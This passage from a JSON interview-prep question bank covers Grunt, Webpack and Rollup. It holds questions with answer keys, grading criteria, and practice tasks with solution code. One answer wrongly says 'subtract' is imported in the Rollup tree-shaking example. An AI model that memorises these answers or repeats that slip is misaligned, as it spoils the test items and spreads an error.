          "tags": [
            "Grunt",
            "Task Runner",
            "Configuration",
            "Code Example"
          ],
          "prerequisites": [
            "Grunt Basics",
            "JavaScript"
          ],
          "complexity": 6,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_grunt_plugin_loading",
          "topic": "Grunt Task Runner",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the purpose of `grunt.loadNpmTasks()` in a `Gruntfile.js`?",
          "answer": "`grunt.loadNpmTasks()` is used to load a Grunt plugin, making its tasks available for use within the `Gruntfile.js`. Without loading the plugin, tasks defined by it (like `sass` from `grunt-contrib-sass`) cannot be referenced or configured.",
          "analysisPoints": [
            "Understanding of Grunt's plugin system.",
            "Role of this specific API call."
          ],
          "keyConcepts": [
            "Grunt plugins",
            "Gruntfile.js",
            "Task availability"
          ],
          "evaluationCriteria": [
            "Concise and accurate definition."
          ],
          "example": null,
          "tags": [
            "Grunt",
            "Flashcard",
            "Task Runner",
            "Plugins"
          ],
          "prerequisites": [
            "Grunt Basics"
          ],
          "complexity": 3,
          "interviewFrequency": 5,
          "learningPath": "beginner"
        },
        {
          "id": "question_gruntfile_structure_mcq",
          "topic": "Grunt Task Runner",
          "level": "medium",
          "type": "mcq",
          "question": "Consider the following Gruntfile.js structure:\n\n```javascript\n// Gruntfile.js\nmodule.exports = function(grunt) {\n  grunt.initConfig({\n    taskA: { /* config */ },\n    taskB: { /* config */ }\n  });\n\n  grunt.loadNpmTasks('plugin-for-taskA');\n  grunt.loadNpmTasks('plugin-for-taskB');\n\n  grunt.registerTask('myCustomTask', ['taskA', 'taskB']);\n};\n```\n\nIf you run `grunt myCustomTask` from the terminal, what is the expected order of execution?",
          "answer": "TaskA then TaskB",
          "options": [
            "TaskB then TaskA",
            "TaskA then TaskB",
            "Both TaskA and TaskB run in parallel",
            "It depends on the operating system"
          ],
          "analysisPoints": [
            "Understanding of `grunt.registerTask` and task chaining.",
            "Knowledge that Grunt tasks in an array are executed sequentially.",
            "Distinction between sequential and parallel execution in build tools."
          ],
          "keyConcepts": [
            "Grunt task execution order",
            "Sequential tasks",
            "registerTask"
          ],
          "evaluationCriteria": [
            "Correct identification of sequential execution.",
            "Exclusion of incorrect assumptions like parallelism or OS dependency."
          ],
          "example": "The `grunt.registerTask('myCustomTask', ['taskA', 'taskB']);` line explicitly defines that `taskA` will be run first, and only after `taskA` completes successfully, `taskB` will begin. Grunt processes tasks listed in an array sequentially by default.",
          "tags": [
            "Grunt",
            "Task Runner",
            "Execution Order",
            "MCQ"
          ],
          "prerequisites": [
            "Grunt Basics"
          ],
          "complexity": 5,
          "interviewFrequency": 6,
          "learningPath": "intermediate"
        },
        {
          "id": "question_module_bundler_purpose",
          "topic": "Module Bundlers",
          "level": "easy",
          "type": "open",
          "question": "What is the primary purpose of a module bundler in modern web development?",
          "answer": "The primary purpose of a module bundler is to combine multiple JavaScript modules (and other assets like CSS, images) into a single or a few optimized bundles. This process allows developers to use modern JavaScript features (like ES Modules) and various pre-processors (e.g., TypeScript, Sass) in their development workflow, while ensuring the output is compatible with browsers and optimized for performance (e.g., smaller file sizes, fewer HTTP requests) for production deployment.",
          "analysisPoints": [
            "Identification of core function: combining modules.",
            "Recognition of benefits: compatibility, performance optimization.",
            "Understanding of the context: modern web development practices."
          ],
          "keyConcepts": [
            "Module bundler",
            "Dependency graph",
            "Optimization",
            "Compatibility",
            "Development workflow"
          ],
          "evaluationCriteria": [
            "Completeness of the explanation, covering both technical function and benefits."
          ],
          "example": null,
          "tags": [
            "Module Bundler",
            "Frontend Development",
            "Optimization"
          ],
          "prerequisites": [
            "JavaScript Modules"
          ],
          "complexity": 4,
          "interviewFrequency": 8,
          "learningPath": "beginner"
        },
        {
          "id": "question_bundler_vs_task_runner",
          "topic": "Module Bundlers vs. Task Runners",
          "level": "medium",
          "type": "open",
          "question": "Differentiate between a 'task runner' like Grunt and a 'module bundler' like Webpack, focusing on their primary responsibilities and how they achieve their goals.",
          "answer": "A **Task Runner (e.g., Grunt)** primarily automates repetitive, discrete development tasks (like linting, compiling Sass, minifying files, running tests). It operates based on configurations, executing defined tasks in a specified sequence. Its goal is workflow automation, replacing manual CLI commands or scripts.\n\nA **Module Bundler (e.g., Webpack)**, on the other hand, focuses on building a comprehensive dependency graph of an entire application. Its main responsibility is to resolve all module dependencies, process various asset types (JS, CSS, images) through 'loaders', and combine them into optimized bundles for deployment. Its goal is to create production-ready code that is efficient for browsers, supports modern JavaScript features, and handles module resolution.\n\nThe key difference lies in their scope and approach: Task runners automate *tasks*, while bundlers *transform and combine modules* to build an application's deployable assets.",
          "analysisPoints": [
            "Clear definition of task runner's role (automation of discrete tasks).",
            "Clear definition of module bundler's role (dependency graph, bundling, optimization).",
            "Ability to highlight the core conceptual difference: task automation vs. application asset compilation.",
            "Use of examples to illustrate the point."
          ],
          "keyConcepts": [
            "Task runner",
            "Module bundler",
            "Grunt",
            "Webpack",
            "Automation",
            "Dependency graph",
            "Bundling"
          ],
          "evaluationCriteria": [
            "Accuracy and conciseness of definitions.",
            "Effectiveness of comparison in highlighting key differences."
          ],
          "example": null,
          "tags": [
            "Task Runner",
            "Module Bundler",
            "Comparison",
            "Grunt",
            "Webpack"
          ],
          "prerequisites": [
            "Grunt",
            "Webpack"
          ],
          "complexity": 7,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_code_splitting_benefits",
          "topic": "Module Bundlers",
          "level": "medium",
          "type": "open",
          "question": "What is code splitting in the context of module bundlers, and what are its main benefits for web application performance?",
          "answer": "Code splitting is a feature of module bundlers that allows dividing your application's code into smaller, separate chunks that can be loaded on demand or in parallel, rather than bundling everything into a single large file. \n\n**Main benefits:**\n1.  **Faster Initial Load Times**: By only loading the necessary code for the current view, the initial bundle size is reduced, leading to quicker page loads.\n2.  **Improved User Experience**: Users can interact with the page sooner as less data needs to be downloaded and parsed upfront.\n3.  **Better Caching**: Changes to one part of the application only invalidate the cache for that specific chunk, allowing users to reuse cached code for other parts of the application.\n4.  **Resource Management**: Reduces memory footprint and parsing/execution time, especially on lower-end devices.",
          "analysisPoints": [
            "Correct definition of code splitting.",
            "Ability to articulate multiple performance benefits.",
            "Understanding of how it impacts user experience and resource utilization."
          ],
          "keyConcepts": [
            "Code splitting",
            "Performance optimization",
            "Lazy loading",
            "Bundle size",
            "Caching"
          ],
          "evaluationCriteria": [
            "Clarity and completeness of explanation.",
            "Identification of all key benefits."
          ],
          "example": null,
          "tags": [
            "Module Bundler",
            "Performance",
            "Optimization",
            "Code Splitting"
          ],
          "prerequisites": [
            "Web Performance",
            "Bundling"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "advanced"
        },
        {
          "id": "question_tree_shaking_definition_flashcard",
          "topic": "Module Bundlers",
          "level": "easy",
          "type": "flashcard",
          "question": "Define 'tree-shaking' in the context of JavaScript module bundling.",
          "answer": "Tree-shaking (also known as 'dead code elimination') is an optimization technique used by module bundlers to remove unused code from the final bundle. It relies on the static analysis capabilities of ES Modules to determine which `import` statements are actually used, discarding any code that is imported but never executed.",
          "analysisPoints": [
            "Correct definition.",
            "Mention of ES Modules' role in enabling it.",
            "Reference to 'dead code elimination'."
          ],
          "keyConcepts": [
            "Tree-shaking",
            "Dead code elimination",
            "ES Modules",
            "Optimization",
            "Bundle size"
          ],
          "evaluationCriteria": [
            "Concise and accurate definition."
          ],
          "example": null,
          "tags": [
            "Module Bundler",
            "Flashcard",
            "Optimization",
            "Tree-shaking"
          ],
          "prerequisites": [
            "JavaScript Modules"
          ],
          "complexity": 4,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_webpack_entry_output",
          "topic": "Webpack",
          "level": "easy",
          "type": "flashcard",
          "question": "In Webpack, what is the purpose of the `entry` and `output` configurations?",
          "answer": "`entry` specifies the starting point(s) of your application, from which Webpack begins building its internal dependency graph. `output` specifies where Webpack should emit the bundled files and how to name them.",
          "analysisPoints": [
            "Correctly identifies the role of `entry` as the starting point.",
            "Correctly identifies the role of `output` for bundle location and naming."
          ],
          "keyConcepts": [
            "Webpack configuration",
            "Entry point",
            "Output bundle"
          ],
          "evaluationCriteria": [
            "Concise and accurate definitions for both terms."
          ],
          "example": null,
          "tags": [
            "Webpack",
            "Flashcard",
            "Configuration"
          ],
          "prerequisites": [
            "Webpack Basics"
          ],
          "complexity": 3,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_webpack_loaders_vs_plugins",
          "topic": "Webpack",
          "level": "medium",
          "type": "open",
          "question": "Distinguish between 'loaders' and 'plugins' in Webpack, providing an example use case for each.",
          "answer": "**Loaders** in Webpack are used to transform files of different types (non-JavaScript assets) into valid modules that can be consumed by your application and added to the dependency graph. Webpack only understands JavaScript natively, so loaders are crucial for processing other file types.\n*   **Example**: `babel-loader` transforms ES6+ JavaScript into ES5. `css-loader` and `style-loader` process CSS files.\n\n**Plugins** in Webpack are more powerful and can perform a wider range of tasks, hooking into various stages of Webpack's compilation process. They can modify how bundles are optimized, manage assets, inject environment variables, etc.\n*   **Example**: `HtmlWebpackPlugin` generates an HTML file and automatically injects your bundled scripts. `MiniCssExtractPlugin` extracts CSS into separate files.",
          "analysisPoints": [
            "Clear definition of loaders and their purpose (transforming modules).",
            "Clear definition of plugins and their broader capabilities (hooking into build process).",
            "Relevant and accurate examples for both.",
            "Understanding of Webpack's internal module handling."
          ],
          "keyConcepts": [
            "Webpack loaders",
            "Webpack plugins",
            "Module transformation",
            "Build process hooks",
            "Dependency graph"
          ],
          "evaluationCriteria": [
            "Accuracy of definitions.",
            "Relevance and clarity of examples.",
            "Ability to differentiate between their distinct roles."
          ],
          "example": null,
          "tags": [
            "Webpack",
            "Loaders",
            "Plugins",
            "Core Concepts"
          ],
          "prerequisites": [
            "Webpack Basics"
          ],
          "complexity": 7,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_webpack_babel_loader_purpose",
          "topic": "Webpack",
          "level": "medium",
          "type": "mcq",
          "question": "Consider the following Webpack `module.rules` configuration:\n\n```javascript\n{\n  test: /\\.js$/,\n  exclude: /node_modules/,\n  use: {\n    loader: 'babel-loader',\n    options: {\n      presets: ['@babel/preset-env', '@babel/preset-react']\n    }\n  }\n}\n```\n\nWhat is the primary purpose of `babel-loader` with these presets in a Webpack setup?",
          "answer": "To transpile modern JavaScript (ES6+) and JSX into older, browser-compatible JavaScript (ES5).",
          "options": [
            "To minify JavaScript files for production.",
            "To transpile modern JavaScript (ES6+) and JSX into older, browser-compatible JavaScript (ES5).",
            "To convert CSS files into JavaScript modules.",
            "To resolve Node.js modules from `node_modules`."
          ],
          "analysisPoints": [
            "Understanding of `babel-loader`'s function.",
            "Knowledge of `@babel/preset-env` and `@babel/preset-react`'s roles.",
            "Distinction between transpilation and other build processes (minification, CSS handling, module resolution)."
          ],
          "keyConcepts": [
            "Webpack loaders",
            "Babel",
            "Transpilation",
            "ES6+",
            "JSX"
          ],
          "evaluationCriteria": [
            "Correct identification of `babel-loader`'s primary role.",
            "Exclusion of incorrect options that describe other tools or processes."
          ],
          "example": "When a `.js` file containing `const greeting = () => <p>Hello</p>;` is processed by this `babel-loader` configuration, it would be transformed into equivalent ES5 JavaScript and `React.createElement` calls, making it runnable in older browsers that don't support arrow functions or JSX directly.",
          "tags": [
            "Webpack",
            "Loader",
            "Babel",
            "Transpilation",
            "MCQ"
          ],
          "prerequisites": [
            "Webpack Loaders",
            "Babel Basics"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_webpack_module_rules_order",
          "topic": "Webpack",
          "level": "medium",
          "type": "code",
          "question": "Suppose you have a `.less` file that needs to be compiled to CSS, then processed by `postcss-loader` for vendor prefixes, and finally injected into the DOM by `style-loader`. Write the `module.rules` entry for this scenario, ensuring the correct order of loaders.",
          "answer": "```javascript\nmodule.exports = {\n  // ...\n  module: {\n    rules: [\n      {\n        test: /\\.less$/,\n        use: [\n          'style-loader', // 3. Injects CSS into the DOM\n          'css-loader',   // 2. Interprets @import and url() like import/require()\n          'postcss-loader', // 1. Processes CSS with PostCSS (e.g., autoprefixer)\n          'less-loader'   // 0. Compiles Less to CSS\n        ]\n      }\n    ]\n  }\n  // ...\n};\n```",
          "options": [],
          "analysisPoints": [
            "Correct `test` regex for `.less` files.",
            "Correct `use` array for multiple loaders.",
            "Understanding that loaders in `use` are applied from right-to-left (or bottom-to-top in array).",
            "Knowledge of typical CSS loader chain (Less -> PostCSS -> CSS Loader -> Style Loader)."
          ],
          "keyConcepts": [
            "Webpack loaders",
            "Loader order",
            "CSS pre-processors",
            "Asset processing"
          ],
          "evaluationCriteria": [
            "Syntactic correctness of the rule.",
            "Logical order of loaders."
          ],
          "example": "The key here is the order in the `use` array. `less-loader` runs first to convert `.less` to CSS. Then `postcss-loader` applies transformations like autoprefixing. `css-loader` interprets `@import` and `url()` statements, and finally `style-loader` takes the resulting CSS and injects it into the HTML `<head>` tag at runtime.",
          "tags": [
            "Webpack",
            "Loaders",
            "CSS",
            "Code Example"
          ],
          "prerequisites": [
            "Webpack Loaders"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "advanced"
        },
        {
          "id": "question_htmlwebpackplugin_purpose_flashcard",
          "topic": "Webpack",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the main function of the `HtmlWebpackPlugin` in a Webpack configuration?",
          "answer": "The `HtmlWebpackPlugin` simplifies the creation of HTML files to serve your Webpack bundles. It can generate an HTML file from scratch or use a template, and it automatically injects your bundled JavaScript files (and optionally CSS) into the generated HTML, removing the need for manual `<script>` and `<link>` tag management.",
          "analysisPoints": [
            "Identification of its core purpose: HTML generation and script injection.",
            "Understanding its role in simplifying the setup process."
          ],
          "keyConcepts": [
            "Webpack plugins",
            "HTML generation",
            "Script injection",
            "Automation"
          ],
          "evaluationCriteria": [
            "Concise and accurate definition."
          ],
          "example": null,
          "tags": [
            "Webpack",
            "Flashcard",
            "Plugins",
            "HTML"
          ],
          "prerequisites": [
            "Webpack Plugins"
          ],
          "complexity": 4,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_webpack_mode_impact_mcq",
          "topic": "Webpack",
          "level": "medium",
          "type": "mcq",
          "question": "Which of the following is TRUE regarding Webpack's `mode` configuration (e.g., `development`, `production`)?",
          "answer": "Setting `mode: 'production'` enables built-in optimizations like minification and tree-shaking by default.",
          "options": [
            "Setting `mode: 'development'` optimizes the bundle for smallest file size.",
            "The `mode` setting primarily affects the type of module resolution (CommonJS vs. ES Modules).",
            "Setting `mode: 'production'` enables built-in optimizations like minification and tree-shaking by default.",
            "The `mode` configuration is only relevant for the `webpack-dev-server` and has no impact on the final build output."
          ],
          "analysisPoints": [
            "Understanding the impact of `mode` on Webpack's built-in optimizations.",
            "Distinguishing between `development` and `production` modes' goals.",
            "Dispelling common misconceptions about `mode`'s effects (e.g., on module resolution or only dev server)."
          ],
          "keyConcepts": [
            "Webpack mode",
            "Development mode",
            "Production mode",
            "Optimization",
            "Minification",
            "Tree-shaking"
          ],
          "evaluationCriteria": [
            "Correct identification of `production` mode's effects.",
            "Ability to differentiate from incorrect statements."
          ],
          "example": "In `production` mode, Webpack automatically applies `UglifyJsPlugin` (or a similar minifier) and sets certain environment variables for performance, leading to a smaller, more performant bundle. In `development` mode, it prioritizes speed and helpful debugging information, often foregoing aggressive minification.",
          "tags": [
            "Webpack",
            "Configuration",
            "Optimization",
            "MCQ"
          ],
          "prerequisites": [
            "Webpack Basics"
          ],
          "complexity": 6,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_rollup_es_modules_focus",
          "topic": "Rollup",
          "level": "medium",
          "type": "open",
          "question": "Rollup is known for its strong focus on ES Modules. Explain why this focus is beneficial, particularly for features like tree-shaking.",
          "answer": "Rollup's strong focus on ES Modules (`import`/`export`) is beneficial because ES Modules are static. This means their imports and exports can be determined at build time without executing the code. This static nature allows Rollup to perform highly effective **tree-shaking (dead code elimination)** and **scope hoisting**.\n\nFor tree-shaking, Rollup can precisely analyze the dependency graph and identify exactly which exports are imported and used by other modules. Any code that is imported but never referenced, or any entire modules that are never imported, can be safely removed from the final bundle, leading to significantly smaller output sizes, especially for libraries. CommonJS modules, being dynamic, make such static analysis and efficient tree-shaking much harder.",
          "analysisPoints": [
            "Understanding of ES Modules' static nature.",
            "Connection between static analysis and tree-shaking.",
            "Explanation of how tree-shaking benefits bundle size.",
            "Implicit understanding of CommonJS limitations for static analysis."
          ],
          "keyConcepts": [
            "Rollup",
            "ES Modules",
            "Static analysis",
            "Tree-shaking",
            "Scope hoisting",
            "Bundle size optimization"
          ],
          "evaluationCriteria": [
            "Clarity on static nature of ES Modules.",
            "Direct link to tree-shaking efficacy.",
            "Mention of bundle size benefits."
          ],
          "example": null,
          "tags": [
            "Rollup",
            "ES Modules",
            "Tree-shaking",
            "Optimization"
          ],
          "prerequisites": [
            "JavaScript Modules",
            "ES6+"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "advanced"
        },
        {
          "id": "question_rollup_tree_shaking",
          "topic": "Rollup",
          "level": "hard",
          "type": "code",
          "question": "Consider the following JavaScript code. If this code were bundled with Rollup, which functions would likely be included in the final production bundle, assuming aggressive tree-shaking, and why?\n\n`src/utils.js`:\n```javascript\nexport function add(a, b) {\n  return a + b;\n}\n\nexport function subtract(a, b) {\n  console.log('Subtracting...');\n  return a - b;\n}\n\nexport function multiply(a, b) {\n  return a * b;\n}\n\nfunction divide(a, b) { // Not exported\n  return a / b;\n}\n```\n\n`src/main.js`:\n```javascript\nimport { add, multiply } from './utils.js';\n\nconst result1 = add(5, 3);\nconst result2 = multiply(4, 2);\n\nconsole.log(result1, result2);\n```",
          "answer": "Functions likely included: `add` and `multiply`.\n\n**Explanation:**\nRollup's tree-shaking works by statically analyzing ES module imports and exports. In `src/main.js`, only `add` and `multiply` are explicitly imported from `src/utils.js`. Because `subtract` is imported but never used, and `divide` is not exported at all, Rollup's tree-shaking mechanism will identify these as dead code and exclude them from the final bundle. This leads to a smaller, more optimized output.",
          "options": [],
          "analysisPoints": [
            "Understanding of tree-shaking principles.",
            "Ability to trace module imports and usage.",
            "Distinction between exported and unexported functions for tree-shaking.",
            "Recognition that unused imported functions are eliminated."
          ],
          "keyConcepts": [
            "Rollup",
            "Tree-shaking",
            "ES Modules",
            "Dead code elimination",
            "Static analysis"
          ],
          "evaluationCriteria": [
            "Correct identification of included functions.",
            "Accurate explanation of why specific functions are included/excluded based on tree-shaking logic."
          ],
          "example": null,
          "tags": [
            "Rollup",
            "Tree-shaking",
            "Code Example",
            "Optimization"
          ],
          "prerequisites": [
            "Rollup Basics",
            "ES Modules"
          ],
          "complexity": 8,
          "interviewFrequency": 9,
          "learningPath": "advanced"
        },
        {
          "id": "question_rollup_output_formats_mcq",
          "topic": "Rollup",
          "level": "medium",
          "type": "mcq",
          "question": "Which Rollup output format is typically used for a JavaScript library that needs to be consumed directly in a browser via a `<script>` tag and wrap its code in an Immediately Invoked Function Expression (IIFE)?",
          "answer": "`iife`",
          "options": [
            "`esm`",
            "`cjs`",
            "`umd`",
            "`iife`"
          ],
          "analysisPoints": [
            "Knowledge of Rollup's `output.format` options.",
            "Understanding of the purpose and structure of different module formats (IIFE, ESM, CJS, UMD).",
            "Ability to match a use case to the appropriate format."
          ],
          "keyConcepts": [
            "Rollup output formats",
            "IIFE",
            "ES Modules",
            "CommonJS",
            "UMD",
            "Library distribution"
          ],
          "evaluationCriteria": [
            "Correct identification of the `iife` format for the specified use case."
          ],
          "example": "The `iife` format (Immediately Invoked Function Expression) wraps the bundled code in a function that executes immediately. This is suitable for adding a library to a global scope in a browser environment, preventing variable leaks and ensuring the code runs upon loading without requiring specific module loaders.",
          "tags": [
            "Rollup",
            "Output Format",
            "IIFE",
            "Library Development",
            "MCQ"
          ],
          "prerequisites": [
            "JavaScript Module Formats"
          ],
          "complexity": 6,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_webpack_vs_rollup_comparison",
          "topic": "Webpack vs. Rollup",
          "level": "hard",
          "type": "open",
          "question": "Compare Webpack and Rollup, highlighting their strengths and weaknesses, and suggest typical use cases where one might be preferred over the other.",
          "answer": "**Webpack:**\n*   **Strengths**: Extremely versatile, robust for complex Single Page Applications (SPAs) with many assets (JS, CSS, images, fonts), excellent Hot Module Replacement (HMR) for development, mature ecosystem with vast loaders/plugins, supports dynamic imports and code splitting well.\n*   **Weaknesses**: Can be more complex to configure, especially for beginners. Output bundles for libraries can sometimes be larger due to wrapping each module in a function.\n*   **Use Cases**: Large-scale SPAs (e.g., React, Angular, Vue applications), projects requiring extensive asset management, code splitting, and a rich development experience.\n\n**Rollup:**\n*   **Strengths**: Produces highly optimized, smaller bundles, especially for libraries, due to superior tree-shaking and scope hoisting (thanks to its ES Modules-first approach). Simpler configuration for library builds. Supports various output formats (IIFE, CJS, ESM, UMD).\n*   **Weaknesses**: Less focus on HMR or dev server features compared to Webpack. Can be less suitable for complex SPAs with dynamic imports or numerous non-JavaScript assets without more intricate plugin setups.\n*   **Use Cases**: JavaScript libraries, component libraries, frameworks (e.g., React, Vue, Svelte use Rollup for their core builds), simple applications where minimal bundle size is critical.",
          "analysisPoints": [
            "Comprehensive comparison of strengths and weaknesses for both tools.",
            "Identification of their primary design philosophies.",
            "Accurate suggestion of typical use cases based on their strengths.",
            "Mention of key features like HMR, tree-shaking, configuration complexity."
          ],
          "keyConcepts": [
            "Webpack",
            "Rollup",
            "Module bundler comparison",
            "SPA",
            "Library development",
            "Tree-shaking",
            "HMR",
            "Configuration complexity"
          ],
          "evaluationCriteria": [
            "Balanced and detailed comparison.",
            "Clear distinction in typical use cases.",
            "Accuracy of listed features/downsides."
          ],
          "example": null,
          "tags": [
            "Webpack",
            "Rollup",
            "Comparison",
            "Module Bundler",
            "Frontend Architecture"
          ],
          "prerequisites": [
            "Webpack",
            "Rollup"
          ],
          "complexity": 9,
          "interviewFrequency": 10,
          "learningPath": "advanced"
        },
        {
          "id": "question_scope_hoisting_flashcard",
          "topic": "Rollup",
          "level": "medium",
          "type": "flashcard",
          "question": "What is 'scope hoisting' in the context of module bundling, and which bundler mentioned heavily leverages it?",
          "answer": "Scope hoisting (also known as 'module concatenation' or 'hoisting') is an optimization technique where multiple modules are combined into a single function scope instead of being wrapped in separate function closures. This reduces overhead, leading to smaller bundle sizes and faster runtime execution because the JavaScript engine has less scope hierarchy to traverse. Rollup heavily leverages scope hoisting due to its ES Modules-first approach, which allows for static analysis necessary for this optimization.",
          "analysisPoints": [
            "Correct definition of scope hoisting.",
            "Understanding of its benefits (smaller size, faster execution).",
            "Identification of Rollup as a primary proponent.",
            "Connection to ES Modules and static analysis."
          ],
          "keyConcepts": [
            "Scope hoisting",
            "Module concatenation",
            "Optimization",
            "Rollup",
            "ES Modules"
          ],
          "evaluationCriteria": [
            "Concise and accurate definition.",
            "Correctly links it to Rollup."
          ],
          "example": null,
          "tags": [
            "Rollup",
            "Flashcard",
            "Optimization",
            "Scope Hoisting"
          ],
          "prerequisites": [
            "JavaScript Scopes",
            "Module Bundling"
          ],
          "complexity": 6,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_grunt_vs_webpack_flashcard",
          "topic": "Build Tools Comparison",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the fundamental difference in purpose between Grunt and Webpack?",
          "answer": "Grunt is a task runner focused on automating arbitrary development tasks (like linting, minifying). Webpack is a module bundler focused on building a dependency graph and bundling application modules (JS, CSS, etc.) into optimized assets for deployment.",
          "analysisPoints": [
            "Clear distinction between task automation and module bundling/asset compilation.",
            "Identification of each tool's primary role."
          ],
          "keyConcepts": [
            "Grunt",
            "Webpack",
            "Task Runner",
            "Module Bundler",
            "Purpose comparison"
          ],
          "evaluationCriteria": [
            "Concise and accurate distinction."
          ],
          "example": null,
          "tags": [
            "Grunt",
            "Webpack",
            "Comparison",
            "Flashcard"
          ],
          "prerequisites": [
            "Basic Build Tools"
          ],
          "complexity": 4,
          "interviewFrequency": 8,
          "learningPath": "beginner"
        },
        {
          "id": "question_bundler_loader_plugin_mcq",
          "topic": "Webpack Concepts",
          "level": "medium",
          "type": "mcq",
          "question": "Which of the following statements accurately describes the role of a Webpack Loader?",
          "answer": "A Webpack Loader transforms non-JavaScript files into modules that Webpack can process.",
          "options": [
            "A Webpack Loader is used to optimize the overall bundle size by removing unused code.",
            "A Webpack Loader defines the entry point(s) of an application.",
            "A Webpack Loader performs a wider range of tasks, like asset management or environment injection, by hooking into the compilation lifecycle.",
            "A Webpack Loader transforms non-JavaScript files into modules that Webpack can process."
          ],
          "analysisPoints": [
            "Correct identification of Loader's purpose (transformation).",
            "Distinction from other Webpack concepts like Plugins (broader tasks), Entry (start point), and Optimizations (overall bundle).",
            "Understanding that Webpack inherently understands only JS."
          ],
          "keyConcepts": [
            "Webpack Loader",
            "Transformation",
            "Module processing",
            "Webpack internals"
          ],
          "evaluationCriteria": [
            "Accurate description of a Loader's function.",
            "Rejection of descriptions for other Webpack components."
          ],
          "example": "For instance, `css-loader` reads a `.css` file and transforms it into a JavaScript module that exports the CSS as a string, allowing it to be included in the Webpack dependency graph. Without a loader, Webpack would throw an error if it encountered an `import 'style.css'` statement.",
          "tags": [
            "Webpack",
            "Loader",
            "MCQ",
            "Core Concepts"
          ],
          "prerequisites": [
            "Webpack Basics"
          ],
          "complexity": 5,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        }
      ],
      "tasks": [
        {
          "id": "task_grunt_css_minification",
          "title": "Automate CSS Minification with Grunt",
          "description": "\nAs a frontend developer, you need to set up a Grunt task to automatically minify CSS files for production deployment. Your task is to:\n\n1.  Set up a `Gruntfile.js`.\n2.  Install the necessary Grunt plugin for CSS minification (e.g., `grunt-contrib-cssmin`).\n3.  Configure a `cssmin` task to take an input CSS file from `src/css/styles.css` and output a minified version to `dist/css/styles.min.css`.\n4.  Create a `default` Grunt task that runs your `cssmin` task.\n5.  (Optional but recommended for testing) Add a `watch` task that triggers `cssmin` when `src/css/styles.css` changes.\n\nYour solution should demonstrate correct Grunt configuration syntax and plugin usage.\n",
          "difficulty": "medium",
          "startingCode": "// Gruntfile.js\nmodule.exports = function(grunt) {\n  // 1. Initialize Grunt configuration\n  grunt.initConfig({\n    // 2. Configure the cssmin task here\n    // cssmin: {\n    //   options: { /* ... */ },\n    //   dist: {\n    //     files: { /* ... */ }\n    //   }\n    // },\n    // Optional: watch configuration\n    // watch: { /* ... */ }\n  });\n\n  // 3. Load Grunt plugins here\n  // grunt.loadNpmTasks('...');\n\n  // 4. Register the default task here\n  // grunt.registerTask('default', ['...']);\n};\n",
          "solutionCode": "// Gruntfile.js\nmodule.exports = function(grunt) {\n  // Project configuration.\n  grunt.initConfig({\n    cssmin: {\n      options: {\n        level: {\n          1: {\n            // Add more aggressive minification options here if needed\n            // For example, removing comments, optimizing colors etc.\n          }\n        }\n      },\n      dist: {\n        files: {\n          'dist/css/styles.min.css': 'src/css/styles.css'\n        }\n      }\n    },\n    watch: {\n      css: {\n        files: ['src/css/**/*.css'],\n        tasks: ['cssmin'],\n        options: {\n          spawn: false // For faster reloads with watch\n        }\n      }\n    }\n  });\n\n  // Load Grunt plugins.\n  grunt.loadNpmTasks('grunt-contrib-cssmin');\n  grunt.loadNpmTasks('grunt-contrib-watch');\n\n  // Register default task(s).\n  grunt.registerTask('default', ['cssmin', 'watch']);\n};\n",
          "testCases": [
            "Run `npm install grunt grunt-contrib-cssmin grunt-contrib-watch` in a new project.",
            "Create `src/css/styles.css` with some unminified CSS.",
            "Run `grunt` from the terminal.",
            "Verify `dist/css/styles.min.css` is created and contains minified CSS.",
            "Modify `src/css/styles.css` and verify `dist/css/styles.min.css` updates automatically when `grunt watch` is running."
          ],
          "hints": [
            "Remember to install `grunt` globally or locally, and then specific plugins using `npm install --save-dev`.",
            "The `files` object in Grunt configuration uses a `destination: source` mapping.",
            "For the `watch` task, the `files` property should be a glob pattern (e.g., `**/*.css`) and `tasks` an array of Grunt task names."
          ],
          "tags": [
            "Grunt",
            "Task Automation",
            "CSS",
            "Minification",
            "Build Tool"
          ],
          "timeEstimate": 45,
          "prerequisites": [
            "Node.js",
            "npm",
            "Grunt Basics"
          ],
          "complexity": 6,
          "interviewRelevance": 7,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "Grunt Configuration",
            "Grunt Plugins",
            "Frontend Performance"
          ]
        },
        {
          "id": "task_webpack_react_app_setup",
          "title": "Configure Webpack for a Basic React Application",
          "description": "\nYour task is to set up a minimal Webpack configuration for a simple React application. This configuration should:\n\n1.  Define `src/index.js` as the entry point.\n2.  Output the bundled JavaScript to `dist/bundle.js`.\n3.  Transpile JavaScript files (including JSX) using `babel-loader` with `@babel/preset-env` and `@babel/preset-react`. Ensure `node_modules` are excluded.\n4.  Process CSS files (`.css`) using `style-loader` and `css-loader`.\n5.  Generate an `index.html` file in the `dist` directory from a template (`src/index.html`) and automatically inject the bundled JavaScript.\n6.  Set the Webpack `mode` to 'development' for better debugging.\n\nProvide the `webpack.config.js` and placeholder `package.json` with scripts.\n",
          "difficulty": "medium",
